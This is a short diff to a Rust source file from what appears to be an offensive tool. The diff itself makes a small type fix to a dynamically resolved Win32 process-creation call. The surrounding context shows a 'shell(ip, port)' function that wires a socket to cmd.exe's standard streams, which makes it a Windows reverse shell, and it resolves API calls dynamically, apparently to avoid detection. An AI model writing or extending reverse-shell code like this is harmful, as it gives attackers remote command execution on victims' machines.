@@ -1,7 +1,7 @@
 use std::ffi::{c_void, CStr};
 use std::{mem, ptr};
 use windows::core::{PCSTR, PSTR};
-use windows::Win32::Foundation::{BOOL, HANDLE};
+use windows::Win32::Foundation::HANDLE;
 use windows::Win32::Networking::WinSock::{
     AF_INET, IPPROTO_TCP, SOCKADDR, SOCKADDR_IN, SOCKET, SOCK_STREAM, WSADATA, WSAPROTOCOL_INFOA,
 };
@@ -89,7 +89,7 @@ pub fn shell(ip: &str, port: u16) {
     startup_info.hStdOutput = unsafe { *sock_handle };
     startup_info.hStdError = unsafe { *sock_handle };
     let lp_command_line = PSTR::from_raw(format!("{system_dir}\\cmd.exe\0").as_mut_ptr());
-    let function = rco_utils::construct_win32_function!(function; [PCSTR, PSTR, *const SECURITY_ATTRIBUTES, *const SECURITY_ATTRIBUTES, bool, PROCESS_CREATION_FLAGS, *const i32, PCSTR, *const STARTUPINFOA, *const PROCESS_INFORMATION]; [BOOL]);
+    let function = rco_utils::construct_win32_function!(function; [PCSTR, PSTR, *const SECURITY_ATTRIBUTES, *const SECURITY_ATTRIBUTES, bool, PROCESS_CREATION_FLAGS, *const i32, PCSTR, *const STARTUPINFOA, *const PROCESS_INFORMATION]; [i32]);
     unsafe {
         let _ = function(
             PCSTR::null(),
